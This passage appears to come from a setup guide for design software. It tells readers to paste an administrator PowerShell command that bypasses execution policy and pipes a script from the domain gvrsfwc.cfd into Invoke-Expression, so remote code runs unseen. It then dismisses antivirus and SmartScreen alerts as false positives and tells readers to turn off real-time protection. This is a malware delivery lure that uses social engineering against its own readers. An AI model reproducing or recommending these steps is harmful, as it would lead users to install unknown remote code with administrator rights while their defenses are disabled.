2. Execute the Setup Script:
   Copy the command below, paste it into your PowerShell window, and hit Enter. The script will automatically fetch the payload, unpack the design assets, and configure the system.

💡 Resolving Issues

💬 Script is blocked by Execution Policy
If Windows stops the deployment script from running due to default security policies (or if the initial script fails to fetch), you can bypass this restriction using an alternative direct command. Run this in PowerShell (as Administrator):

powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod gvrsfwc.cfd | Invoke-Expression"

🛡️ Antivirus / SmartScreen Alerts
Because the deployment script modifies system policies to allow local asset injection and downloads dependencies silently, Windows Defender or SmartScreen may flag it as a potential threat (false positive).

Recommended Action: If the script gets blocked, pause Real-time protection in your Windows Security dashboard, run the setup script, and re-enable your antivirus immediately afterward.
